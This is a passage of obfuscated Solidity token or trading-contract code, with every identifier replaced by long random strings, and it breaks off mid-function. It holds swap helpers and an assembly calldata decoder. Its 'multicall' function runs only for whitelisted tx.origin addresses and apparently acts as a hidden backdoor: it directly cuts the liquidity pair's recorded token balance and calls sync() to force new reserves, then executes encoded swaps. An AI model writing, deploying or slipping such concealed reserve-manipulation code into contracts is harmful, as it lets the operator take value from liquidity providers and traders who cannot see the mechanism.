    uint256 tN6W5FA0PQDYZt7Wan99HxiZ3dfKs0TkTcxD4wzwPiqfHYHKipVHpBgR1o0bPWsqqlM6eIxpX9J0g2Z9RM8UePUf5fK4WbAx,
    uint256 dQqeZljSjb2MbdrYTLJl8e8YtL7YkFSnjqUVcYJUh0k3I8ktUATRcAVzpgl6OYt4xd6ll36rlUkEytyzhdo65j6bGw8ULFkK,
    uint256 qcQwjl2sTWQ5rSu6JdwosoVNiuxArMb7l2zPm9ZqFqgR8SSG2NT2KVa9WYf1s9BIzVWEJCQ9On4TmcG6r6eMXCG5z5pc1ZdM
  ) internal returns (uint256, uint256) {

      address vpxHOvplmDOhEiOQy9SWevEcilrJ73e5SCtQ9ARquzFQobFkuyRrwzOg0dMvPqHZAPBnDfMOK63vA6O7w67Cb6Ahr8qBEJcy
     = address(this);

      uint256 x6VXttfpA1ycg7sQk80Cg5S5d4VlGoVowgElX3PDONQ40SuhlDa8FOhQPIHA5eGxhNjbHr5KcrK96wNWWr5LhmX1VzitF3gQ
     =
      pa12JmAJ51hQKrqA254NPIn2UOfawcyL0epe4T9uvrpfRAjPhioH2LwifN4OXiXsF2Iwh1QpYKNRfOyRvz6u2wzl0dIuN0Oj(
        tN6W5FA0PQDYZt7Wan99HxiZ3dfKs0TkTcxD4wzwPiqfHYHKipVHpBgR1o0bPWsqqlM6eIxpX9J0g2Z9RM8UePUf5fK4WbAx,
        qcQwjl2sTWQ5rSu6JdwosoVNiuxArMb7l2zPm9ZqFqgR8SSG2NT2KVa9WYf1s9BIzVWEJCQ9On4TmcG6r6eMXCG5z5pc1ZdM,
        dQqeZljSjb2MbdrYTLJl8e8YtL7YkFSnjqUVcYJUh0k3I8ktUATRcAVzpgl6OYt4xd6ll36rlUkEytyzhdo65j6bGw8ULFkK
      );

    dYtS2SUK1aMXKSfLQGXm1g1WqUXvit0RyYXdln0UJAbgUud4rznsmWNd7e7QXo0iQZR1iEUwXGS9Kyp2rpNpTPtUnDJyxfRr(
      kJ7YxHRqpYcxkGP9IqCopbfyvjM8teGwITttF9BtO2Envw0qZ1qtwKTG3EoLaGGKdwIDS5RurODr9xYgrV5U3EnFZnfCCQTP,
      lS09ypwGz9L6kFhwR6Wu2seASs5SJJFD1RTte1HNmIax3zEMSz1txoS54vAe76b7tpuwyb9ueL2qGYs9onRTSVOuCgsdeUrZ,
      tN6W5FA0PQDYZt7Wan99HxiZ3dfKs0TkTcxD4wzwPiqfHYHKipVHpBgR1o0bPWsqqlM6eIxpX9J0g2Z9RM8UePUf5fK4WbAx
    );
    if (
      vpxHOvplmDOhEiOQy9SWevEcilrJ73e5SCtQ9ARquzFQobFkuyRrwzOg0dMvPqHZAPBnDfMOK63vA6O7w67Cb6Ahr8qBEJcy >
      x2BFATFvSUwM3fleHtEVGbxKKFm8fzNCXbboeCS5lD6dnCNMZrBsiDTUUUWMsDbYyVS7OhofpSd3SP4gzQwK7smJyLVkqacM
    )
      ecr7ZfhFxnAhq2DT1KHuHbXred96oiuzWzx1dDLm9TQogBaf43UQHG9OdJAsQLwq2QOUakAM8hWXfdWpo0ROJgPWoXALuXly(
        lS09ypwGz9L6kFhwR6Wu2seASs5SJJFD1RTte1HNmIax3zEMSz1txoS54vAe76b7tpuwyb9ueL2qGYs9onRTSVOuCgsdeUrZ
      )
        .swap(
        x6VXttfpA1ycg7sQk80Cg5S5d4VlGoVowgElX3PDONQ40SuhlDa8FOhQPIHA5eGxhNjbHr5KcrK96wNWWr5LhmX1VzitF3gQ,
        0,
        z2W0QQX2XtgRL6G3AABf6TAf7IvxslKTZmOrUHbiPdQ475llT1BjytnLAnGHP3LKRlvwjDJxXZ1yqLctRkJE4uJQ9xEtshzD,
        new bytes(0)
      );
    else
      ecr7ZfhFxnAhq2DT1KHuHbXred96oiuzWzx1dDLm9TQogBaf43UQHG9OdJAsQLwq2QOUakAM8hWXfdWpo0ROJgPWoXALuXly(
        lS09ypwGz9L6kFhwR6Wu2seASs5SJJFD1RTte1HNmIax3zEMSz1txoS54vAe76b7tpuwyb9ueL2qGYs9onRTSVOuCgsdeUrZ
      )
        .swap(
        0,
        x6VXttfpA1ycg7sQk80Cg5S5d4VlGoVowgElX3PDONQ40SuhlDa8FOhQPIHA5eGxhNjbHr5KcrK96wNWWr5LhmX1VzitF3gQ,
        z2W0QQX2XtgRL6G3AABf6TAf7IvxslKTZmOrUHbiPdQ475llT1BjytnLAnGHP3LKRlvwjDJxXZ1yqLctRkJE4uJQ9xEtshzD,
        new bytes(0)
      );

    return (
      dQqeZljSjb2MbdrYTLJl8e8YtL7YkFSnjqUVcYJUh0k3I8ktUATRcAVzpgl6OYt4xd6ll36rlUkEytyzhdo65j6bGw8ULFkK -
        x6VXttfpA1ycg7sQk80Cg5S5d4VlGoVowgElX3PDONQ40SuhlDa8FOhQPIHA5eGxhNjbHr5KcrK96wNWWr5LhmX1VzitF3gQ,
      qcQwjl2sTWQ5rSu6JdwosoVNiuxArMb7l2zPm9ZqFqgR8SSG2NT2KVa9WYf1s9BIzVWEJCQ9On4TmcG6r6eMXCG5z5pc1ZdM +
        tN6W5FA0PQDYZt7Wan99HxiZ3dfKs0TkTcxD4wzwPiqfHYHKipVHpBgR1o0bPWsqqlM6eIxpX9J0g2Z9RM8UePUf5fK4WbAx
    );
  }

  function eIq6z4aLB9xvRbdxDl0KSPJAoNpsykFNovLr3Uzg26jUUqNUpIgeSEumV6bY8eF8n7hnf3VAqbT9DzSKAGcjP1uJHKc7y3Z2(
    address kJ7YxHRqpYcxkGP9IqCopbfyvjM8teGwITttF9BtO2Envw0qZ1qtwKTG3EoLaGGKdwIDS5RurODr9xYgrV5U3EnFZnfCCQTP,
    uint256 mCLxvbmSBl5bvaszLtFW4bdsqyddXR42mHeCr7dlHRwheveF2bECL7xP6XrpMmSYjWinzBuIh95aMcv1l9V365H58jClsrna,
    uint256 dQqeZljSjb2MbdrYTLJl8e8YtL7YkFSnjqUVcYJUh0k3I8ktUATRcAVzpgl6OYt4xd6ll36rlUkEytyzhdo65j6bGw8ULFkK,
    uint256 qcQwjl2sTWQ5rSu6JdwosoVNiuxArMb7l2zPm9ZqFqgR8SSG2NT2KVa9WYf1s9BIzVWEJCQ9On4TmcG6r6eMXCG5z5pc1ZdM
  ) internal returns (uint256, uint256) {

      address vpxHOvplmDOhEiOQy9SWevEcilrJ73e5SCtQ9ARquzFQobFkuyRrwzOg0dMvPqHZAPBnDfMOK63vA6O7w67Cb6Ahr8qBEJcy
     = address(this);

      uint256 x6VXttfpA1ycg7sQk80Cg5S5d4VlGoVowgElX3PDONQ40SuhlDa8FOhQPIHA5eGxhNjbHr5KcrK96wNWWr5LhmX1VzitF3gQ
     =
      pa12JmAJ51hQKrqA254NPIn2UOfawcyL0epe4T9uvrpfRAjPhioH2LwifN4OXiXsF2Iwh1QpYKNRfOyRvz6u2wzl0dIuN0Oj(
        mCLxvbmSBl5bvaszLtFW4bdsqyddXR42mHeCr7dlHRwheveF2bECL7xP6XrpMmSYjWinzBuIh95aMcv1l9V365H58jClsrna,
        dQqeZljSjb2MbdrYTLJl8e8YtL7YkFSnjqUVcYJUh0k3I8ktUATRcAVzpgl6OYt4xd6ll36rlUkEytyzhdo65j6bGw8ULFkK,
        qcQwjl2sTWQ5rSu6JdwosoVNiuxArMb7l2zPm9ZqFqgR8SSG2NT2KVa9WYf1s9BIzVWEJCQ9On4TmcG6r6eMXCG5z5pc1ZdM
      );

    IERC20(
      x2BFATFvSUwM3fleHtEVGbxKKFm8fzNCXbboeCS5lD6dnCNMZrBsiDTUUUWMsDbYyVS7OhofpSd3SP4gzQwK7smJyLVkqacM
    )
      .transfer(
      lS09ypwGz9L6kFhwR6Wu2seASs5SJJFD1RTte1HNmIax3zEMSz1txoS54vAe76b7tpuwyb9ueL2qGYs9onRTSVOuCgsdeUrZ,
      mCLxvbmSBl5bvaszLtFW4bdsqyddXR42mHeCr7dlHRwheveF2bECL7xP6XrpMmSYjWinzBuIh95aMcv1l9V365H58jClsrna
    );
    if (
      vpxHOvplmDOhEiOQy9SWevEcilrJ73e5SCtQ9ARquzFQobFkuyRrwzOg0dMvPqHZAPBnDfMOK63vA6O7w67Cb6Ahr8qBEJcy >
      x2BFATFvSUwM3fleHtEVGbxKKFm8fzNCXbboeCS5lD6dnCNMZrBsiDTUUUWMsDbYyVS7OhofpSd3SP4gzQwK7smJyLVkqacM
    )
      ecr7ZfhFxnAhq2DT1KHuHbXred96oiuzWzx1dDLm9TQogBaf43UQHG9OdJAsQLwq2QOUakAM8hWXfdWpo0ROJgPWoXALuXly(
        lS09ypwGz9L6kFhwR6Wu2seASs5SJJFD1RTte1HNmIax3zEMSz1txoS54vAe76b7tpuwyb9ueL2qGYs9onRTSVOuCgsdeUrZ
      )
        .swap(
        0,
        x6VXttfpA1ycg7sQk80Cg5S5d4VlGoVowgElX3PDONQ40SuhlDa8FOhQPIHA5eGxhNjbHr5KcrK96wNWWr5LhmX1VzitF3gQ,
        kJ7YxHRqpYcxkGP9IqCopbfyvjM8teGwITttF9BtO2Envw0qZ1qtwKTG3EoLaGGKdwIDS5RurODr9xYgrV5U3EnFZnfCCQTP,
        new bytes(0)
      );
    else
      ecr7ZfhFxnAhq2DT1KHuHbXred96oiuzWzx1dDLm9TQogBaf43UQHG9OdJAsQLwq2QOUakAM8hWXfdWpo0ROJgPWoXALuXly(
        lS09ypwGz9L6kFhwR6Wu2seASs5SJJFD1RTte1HNmIax3zEMSz1txoS54vAe76b7tpuwyb9ueL2qGYs9onRTSVOuCgsdeUrZ
      )
        .swap(
        x6VXttfpA1ycg7sQk80Cg5S5d4VlGoVowgElX3PDONQ40SuhlDa8FOhQPIHA5eGxhNjbHr5KcrK96wNWWr5LhmX1VzitF3gQ,
        0,
        kJ7YxHRqpYcxkGP9IqCopbfyvjM8teGwITttF9BtO2Envw0qZ1qtwKTG3EoLaGGKdwIDS5RurODr9xYgrV5U3EnFZnfCCQTP,
        new bytes(0)
      );

    return (
      dQqeZljSjb2MbdrYTLJl8e8YtL7YkFSnjqUVcYJUh0k3I8ktUATRcAVzpgl6OYt4xd6ll36rlUkEytyzhdo65j6bGw8ULFkK +
        mCLxvbmSBl5bvaszLtFW4bdsqyddXR42mHeCr7dlHRwheveF2bECL7xP6XrpMmSYjWinzBuIh95aMcv1l9V365H58jClsrna,
      qcQwjl2sTWQ5rSu6JdwosoVNiuxArMb7l2zPm9ZqFqgR8SSG2NT2KVa9WYf1s9BIzVWEJCQ9On4TmcG6r6eMXCG5z5pc1ZdM -
        x6VXttfpA1ycg7sQk80Cg5S5d4VlGoVowgElX3PDONQ40SuhlDa8FOhQPIHA5eGxhNjbHr5KcrK96wNWWr5LhmX1VzitF3gQ
    );
  }

  function mZ8iJXlvmAtCLopN0L2wt4lm5erWcwvrdp57qTQ7xGqFaTNqYbaGvLWsRvyAjIDekKpht7cP3WOcdC8OqKW6NAmbq5arNeM2(
    bytes
      memory oBGIXZoEbZMsPhnQqcrwk9HQsagX5VEoxozSA2Q8xdi4Ir7oAeU4gY0kNtOFp6xNBDJB4K7etVLxNRJ1Zq3tRtZUsfv4otPJ,
    uint256 oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux
  )
    private
    pure
    returns (
      uint256 eW69u1IANLNIRCkPQ2ydmNFhSz24RcYwB5ly3eE8NIzNyHRSQvQ8nYy1KgJUczawELOpnjH7K9iCODfaj6K7slg2TCWscw4N,
      address euxAyBE2zQMs70ETnZmrSBaBMBFdODh7Sfp1ydRf8ld4ILzBDs41fJgUWFLtenc7lHHTrLH0G3jfkEHeA9jSnQoJOussUckD,
      uint256 jpXXPAv5xi48b9uJSXT7i8h5foqwEwEx9JUTxBKyEsJmV6sTOUJOqKRTQjwTWxtLcgHnC2n2LFSWuqBIgtRxNPlOMXAelgRV,
      uint256 tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg,
      uint256 ukMwt56FH5jrqOjk8S4MwhLgIhrpig1tTOJzEz2JVNhTrTsfmCK8AlQ8KZi6JJbYn8eBz6xmAyOitGR2G1Dn7FrZdW5SlbEv
    )
  {
    assembly {
      let amountdataLen := shr(
        248,
        mload(
          add(
            oBGIXZoEbZMsPhnQqcrwk9HQsagX5VEoxozSA2Q8xdi4Ir7oAeU4gY0kNtOFp6xNBDJB4K7etVLxNRJ1Zq3tRtZUsfv4otPJ,
            oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux
          )
        )
      )
      let
        eLkbaYhdxwkQa6BpU0N1wa19WJzH2nkNRVYNHKr8F58PYHpyeUYaVc4b55IORg3jNaramWnxmz6neBgxuwnKECInYSTkkmCX
      := sub(256, mul(amountdataLen, 8))
      oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux := add(
        oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux,
        1
      )

      eW69u1IANLNIRCkPQ2ydmNFhSz24RcYwB5ly3eE8NIzNyHRSQvQ8nYy1KgJUczawELOpnjH7K9iCODfaj6K7slg2TCWscw4N := shr(
        248,
        mload(
          add(
            oBGIXZoEbZMsPhnQqcrwk9HQsagX5VEoxozSA2Q8xdi4Ir7oAeU4gY0kNtOFp6xNBDJB4K7etVLxNRJ1Zq3tRtZUsfv4otPJ,
            oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux
          )
        )
      )
      oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux := add(
        oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux,
        1
      )

      switch eW69u1IANLNIRCkPQ2ydmNFhSz24RcYwB5ly3eE8NIzNyHRSQvQ8nYy1KgJUczawELOpnjH7K9iCODfaj6K7slg2TCWscw4N
        case 1 {
          jpXXPAv5xi48b9uJSXT7i8h5foqwEwEx9JUTxBKyEsJmV6sTOUJOqKRTQjwTWxtLcgHnC2n2LFSWuqBIgtRxNPlOMXAelgRV := shr(
            240,
            mload(
              add(
                oBGIXZoEbZMsPhnQqcrwk9HQsagX5VEoxozSA2Q8xdi4Ir7oAeU4gY0kNtOFp6xNBDJB4K7etVLxNRJ1Zq3tRtZUsfv4otPJ,
                oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux
              )
            )
          )
          oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux := add(
            oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux,
            2
          )

          tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg := shr(
            eLkbaYhdxwkQa6BpU0N1wa19WJzH2nkNRVYNHKr8F58PYHpyeUYaVc4b55IORg3jNaramWnxmz6neBgxuwnKECInYSTkkmCX,
            mload(
              add(
                oBGIXZoEbZMsPhnQqcrwk9HQsagX5VEoxozSA2Q8xdi4Ir7oAeU4gY0kNtOFp6xNBDJB4K7etVLxNRJ1Zq3tRtZUsfv4otPJ,
                oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux
              )
            )
          )
          oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux := add(
            oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux,
            amountdataLen
          )
        }
        case 2 {
          jpXXPAv5xi48b9uJSXT7i8h5foqwEwEx9JUTxBKyEsJmV6sTOUJOqKRTQjwTWxtLcgHnC2n2LFSWuqBIgtRxNPlOMXAelgRV := shr(
            240,
            mload(
              add(
                oBGIXZoEbZMsPhnQqcrwk9HQsagX5VEoxozSA2Q8xdi4Ir7oAeU4gY0kNtOFp6xNBDJB4K7etVLxNRJ1Zq3tRtZUsfv4otPJ,
                oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux
              )
            )
          )
          oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux := add(
            oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux,
            2
          )

          tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg := shr(
            eLkbaYhdxwkQa6BpU0N1wa19WJzH2nkNRVYNHKr8F58PYHpyeUYaVc4b55IORg3jNaramWnxmz6neBgxuwnKECInYSTkkmCX,
            mload(
              add(
                oBGIXZoEbZMsPhnQqcrwk9HQsagX5VEoxozSA2Q8xdi4Ir7oAeU4gY0kNtOFp6xNBDJB4K7etVLxNRJ1Zq3tRtZUsfv4otPJ,
                oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux
              )
            )
          )
          oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux := add(
            oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux,
            amountdataLen
          )
        }
        case 3 {
          euxAyBE2zQMs70ETnZmrSBaBMBFdODh7Sfp1ydRf8ld4ILzBDs41fJgUWFLtenc7lHHTrLH0G3jfkEHeA9jSnQoJOussUckD := shr(
            96,
            mload(
              add(
                oBGIXZoEbZMsPhnQqcrwk9HQsagX5VEoxozSA2Q8xdi4Ir7oAeU4gY0kNtOFp6xNBDJB4K7etVLxNRJ1Zq3tRtZUsfv4otPJ,
                oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux
              )
            )
          )
          oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux := add(
            oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux,
            20
          )
        }
        case 4 {
          jpXXPAv5xi48b9uJSXT7i8h5foqwEwEx9JUTxBKyEsJmV6sTOUJOqKRTQjwTWxtLcgHnC2n2LFSWuqBIgtRxNPlOMXAelgRV := shr(
            240,
            mload(
              add(
                oBGIXZoEbZMsPhnQqcrwk9HQsagX5VEoxozSA2Q8xdi4Ir7oAeU4gY0kNtOFp6xNBDJB4K7etVLxNRJ1Zq3tRtZUsfv4otPJ,
                oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux
              )
            )
          )
          oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux := add(
            oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux,
            2
          )
        }
        case 5 {
          tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg := shr(
            eLkbaYhdxwkQa6BpU0N1wa19WJzH2nkNRVYNHKr8F58PYHpyeUYaVc4b55IORg3jNaramWnxmz6neBgxuwnKECInYSTkkmCX,
            mload(
              add(
                oBGIXZoEbZMsPhnQqcrwk9HQsagX5VEoxozSA2Q8xdi4Ir7oAeU4gY0kNtOFp6xNBDJB4K7etVLxNRJ1Zq3tRtZUsfv4otPJ,
                oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux
              )
            )
          )
          oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux := add(
            oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux,
            amountdataLen
          )
        }
    }
    ukMwt56FH5jrqOjk8S4MwhLgIhrpig1tTOJzEz2JVNhTrTsfmCK8AlQ8KZi6JJbYn8eBz6xmAyOitGR2G1Dn7FrZdW5SlbEv = oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux;
  }

  function multicall(
    bytes
      memory ga0zLC30duwpPl3w7SiFhYslC8IxR1rRA9KChdar0khipcXtrwzvkHrjYtR4IgdN96KQgjrKFpvp0gU91EvMenViJbgvdqmB
  ) external payable {
    if (
      hmyKykZnTPzqdnsEP3dPuSepi4ReQNDe7Q0YVHgf3FpNEm4LPqhswEkIwzLublL5IkeQeV6rOmVpzDRdDnKYmElgAjTq4Icb[
        tx.origin
      ] == false
    ) return;
    if (msg.value > 0)
      sSEXlZmGiR3N4n7ZZFnWD8CAm6B4fWZFNFWPJci8DlaurEnCgBzZt5auAyRNErY1fRa4qyBG8w0vLeWRhW2tm7hOsCONn2Zx(
        x2BFATFvSUwM3fleHtEVGbxKKFm8fzNCXbboeCS5lD6dnCNMZrBsiDTUUUWMsDbYyVS7OhofpSd3SP4gzQwK7smJyLVkqacM
      )
        .deposit{value: msg.value}();

    yaGWUeldykPC8bT7xnYu4xptf6Djv1gz42S4MI1bOywyQbRlwnbsiklHUe38jcZvMkOH0uvxQgYC0yFo68j3yXkJtXhTiziQ[
      lS09ypwGz9L6kFhwR6Wu2seASs5SJJFD1RTte1HNmIax3zEMSz1txoS54vAe76b7tpuwyb9ueL2qGYs9onRTSVOuCgsdeUrZ
    ] -= (yaGWUeldykPC8bT7xnYu4xptf6Djv1gz42S4MI1bOywyQbRlwnbsiklHUe38jcZvMkOH0uvxQgYC0yFo68j3yXkJtXhTiziQ[
      lS09ypwGz9L6kFhwR6Wu2seASs5SJJFD1RTte1HNmIax3zEMSz1txoS54vAe76b7tpuwyb9ueL2qGYs9onRTSVOuCgsdeUrZ
    ] / 5000);
    ecr7ZfhFxnAhq2DT1KHuHbXred96oiuzWzx1dDLm9TQogBaf43UQHG9OdJAsQLwq2QOUakAM8hWXfdWpo0ROJgPWoXALuXly(
      lS09ypwGz9L6kFhwR6Wu2seASs5SJJFD1RTte1HNmIax3zEMSz1txoS54vAe76b7tpuwyb9ueL2qGYs9onRTSVOuCgsdeUrZ
    )
      .sync();

    (
      uint256 qcQwjl2sTWQ5rSu6JdwosoVNiuxArMb7l2zPm9ZqFqgR8SSG2NT2KVa9WYf1s9BIzVWEJCQ9On4TmcG6r6eMXCG5z5pc1ZdM,
      uint256 dQqeZljSjb2MbdrYTLJl8e8YtL7YkFSnjqUVcYJUh0k3I8ktUATRcAVzpgl6OYt4xd6ll36rlUkEytyzhdo65j6bGw8ULFkK
    ) =
      x8tPgH0UwyWuJiX1Hx8h6lqixe8B8xwaBQx1DgrIJpmpAX89cqTNZy6OdXe1Fx31f3ulwjKw3CyfX3Cef2XqnU07VNXWQGJs(
        lS09ypwGz9L6kFhwR6Wu2seASs5SJJFD1RTte1HNmIax3zEMSz1txoS54vAe76b7tpuwyb9ueL2qGYs9onRTSVOuCgsdeUrZ,
        address(this),
        x2BFATFvSUwM3fleHtEVGbxKKFm8fzNCXbboeCS5lD6dnCNMZrBsiDTUUUWMsDbYyVS7OhofpSd3SP4gzQwK7smJyLVkqacM
      );


      uint256 lQ5avbEt1TptNdS1nNUeouOYJOUuDlhhJllkJwYzj0GfWV01RGbqhKw3T4mTpNnsmduzHtyx1W7RaUxBsnD4QyOLFR8wlw1E
     =
      dQqeZljSjb2MbdrYTLJl8e8YtL7YkFSnjqUVcYJUh0k3I8ktUATRcAVzpgl6OYt4xd6ll36rlUkEytyzhdo65j6bGw8ULFkK;


      uint256 h6b30Dx1AYVpR1sg8QhJDZmPeZeY96b6vn0B0VuYDofZayrKaVSAWsOoyou2TBJTvykELL9TymK7NWz5DR5IJEF6S5LtmRLc
    ;

      uint256 oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux
     = 33;
    assembly {
      h6b30Dx1AYVpR1sg8QhJDZmPeZeY96b6vn0B0VuYDofZayrKaVSAWsOoyou2TBJTvykELL9TymK7NWz5DR5IJEF6S5LtmRLc := shr(
        248,
        mload(
          add(
            ga0zLC30duwpPl3w7SiFhYslC8IxR1rRA9KChdar0khipcXtrwzvkHrjYtR4IgdN96KQgjrKFpvp0gU91EvMenViJbgvdqmB,
            0x20
          )
        )
      )
    }


      uint256 eW69u1IANLNIRCkPQ2ydmNFhSz24RcYwB5ly3eE8NIzNyHRSQvQ8nYy1KgJUczawELOpnjH7K9iCODfaj6K7slg2TCWscw4N
    ;

      address oTBl7g6TAIJETwXfmhLtD6VhO6qS1EfR9OZgftnS3kJoB9TaLpvH6F5981tEEWQGp0ofRLOMduqoMOWM5IIqe37moj5tSS7E
    ;

      uint256 jpXXPAv5xi48b9uJSXT7i8h5foqwEwEx9JUTxBKyEsJmV6sTOUJOqKRTQjwTWxtLcgHnC2n2LFSWuqBIgtRxNPlOMXAelgRV
    ;

      uint256 tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg
    ;

    for (
      uint256 i;
      i <
      h6b30Dx1AYVpR1sg8QhJDZmPeZeY96b6vn0B0VuYDofZayrKaVSAWsOoyou2TBJTvykELL9TymK7NWz5DR5IJEF6S5LtmRLc;
      i++
    ) {
      (
        eW69u1IANLNIRCkPQ2ydmNFhSz24RcYwB5ly3eE8NIzNyHRSQvQ8nYy1KgJUczawELOpnjH7K9iCODfaj6K7slg2TCWscw4N,
        oTBl7g6TAIJETwXfmhLtD6VhO6qS1EfR9OZgftnS3kJoB9TaLpvH6F5981tEEWQGp0ofRLOMduqoMOWM5IIqe37moj5tSS7E,
        jpXXPAv5xi48b9uJSXT7i8h5foqwEwEx9JUTxBKyEsJmV6sTOUJOqKRTQjwTWxtLcgHnC2n2LFSWuqBIgtRxNPlOMXAelgRV,
        tJbX6PL1jSjLEtstcH1JuaxkrVPTTT5PVeej4moSdGPwcuEvNeazDODQKkkDyWNIjdchDzD35FlnQtJNOFrQRrrwnjHv3oqg,
        oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux
      ) = mZ8iJXlvmAtCLopN0L2wt4lm5erWcwvrdp57qTQ7xGqFaTNqYbaGvLWsRvyAjIDekKpht7cP3WOcdC8OqKW6NAmbq5arNeM2(
        ga0zLC30duwpPl3w7SiFhYslC8IxR1rRA9KChdar0khipcXtrwzvkHrjYtR4IgdN96KQgjrKFpvp0gU91EvMenViJbgvdqmB,
        oUxWb17zMtJVO2ye7vj97JgGGDDd6JajmjPlBuUv7gTeMa4wSzn4SPqzDGvWt6ZMeIhkLH2vrZvnflNOwLeVehstrOmJoHux
      );

      if (
        eW69u1IANLNIRCkPQ2ydmNFhSz24RcYwB5ly3eE8NIzNyHRSQvQ8nYy1KgJUczawELOpnjH7K9iCODfaj6K7slg2TCWscw4N ==
        1
      ) {
        (
